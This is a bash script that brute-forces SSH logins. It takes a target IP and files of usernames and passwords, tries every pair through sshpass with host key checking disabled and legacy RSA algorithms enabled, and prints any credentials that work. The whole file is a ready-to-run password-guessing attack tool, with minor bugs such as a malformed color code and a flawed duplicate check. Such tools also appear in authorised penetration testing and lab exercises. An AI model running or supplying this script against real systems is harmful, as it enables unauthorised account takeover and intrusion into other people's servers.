#!/bin/bash

# Arguments
ip=$1
user_path=$2
pass_path=$3

# Arrays
password_arr=()
username_arr=()

# Checks if sshpass is installed
check=$(apt list sshpass 2>&1)
if [[ ! ${check} =~ "installed" ]]; then
	echo "Please install sshpass."
	exit
fi

# Checks if arguents are used
if [[ -z ${ip} ]]; then
	read -p "What is the target ip? " ip
fi

if [[ -z ${user_path} ]]; then
	read -p "Please provide a file with usernames (file path) " user_path
fi

if [[ -z ${pass_path} ]]; then
	read -p "Please provide a file with passwords (file path) " pass_path
fi

# Adds every line from username file
while IFS= read -r line; do
	if [[ "${username_arr[@]}" == "${line}" ]]; then
		break
	fi
	username_arr+=("$line")
done < ${user_path}

# Adds every line from password file
while IFS= read -r line; do
	if [[ "${password_arr[@]}" == "${line}" ]]; then
		break
	fi
	password_arr+=("$line")
done < ${pass_path}

# Tries every combination
for ((i=0; i<${#username_arr[@]}; i++)); do
	for ((j=0; j<${#password_arr[@]}; j++)); do
		echo ""
		echo "Trying: ${username_arr[$i]}:${password_arr[$j]}"
		result=$(sshpass -p "${password_arr[$j]}" ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o StrictHostKeyCHecking=no "${username_arr[$i]}"@"${ip}" whoami 2>&1)
		echo "$result"		
		if [[ "${result}" == "${username_arr[$i]}" ]]; then
			echo ""
			echo $'\033[0;32msuccess! \e[0m' $'\n'"Username = ${username_arr[$i]}" $'\n'"Password = ${password_arr[$j]}"
			exit 1	
		fi
	done
done

echo ""
echo $'\033[0;31Failed!\e[0m No usernames or passwords was found.'
